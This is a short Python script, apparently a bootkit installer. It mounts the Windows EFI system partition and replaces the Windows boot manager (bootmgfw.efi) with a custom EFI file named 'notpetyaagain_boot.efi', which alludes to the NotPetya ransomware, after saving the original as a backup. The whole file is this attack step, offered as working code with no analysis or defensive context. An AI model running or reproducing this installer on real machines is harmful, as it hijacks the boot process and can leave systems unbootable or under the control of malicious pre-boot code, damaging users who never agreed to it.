import os
from shutil import copyfile

if __name__ == "__main__":

    try:
        os.system("mountvol Y: /s")

        # bundle_dir = getattr(sys, '_MEIPASS', os.path.abspath(os.path.dirname(__file__)))
        # custom_uefi_path = os.path.abspath(os.path.join(bundle_dir, 'uefi.efi'))
        custom_uefi_path = "notpetyaagain_boot.efi"

        # copyfile(custom_uefi_path, "Y:\\EFI\\Boot\\bootx64.efi")
        copyfile(r"Y:\EFI\Microsoft\Boot\bootmgfw.efi", r"Y:\EFI\Microsoft\Boot\bootmgfw.efi.old")
        copyfile(custom_uefi_path, r"Y:\EFI\Microsoft\Boot\bootmgfw.efi")
        # copyfile(custom_uefi_path, r"Y:\EFI\Boot\bootx64.efi")

        os.system("mountvol Y: /d")
    except Exception as e:
        print(e)

    input()
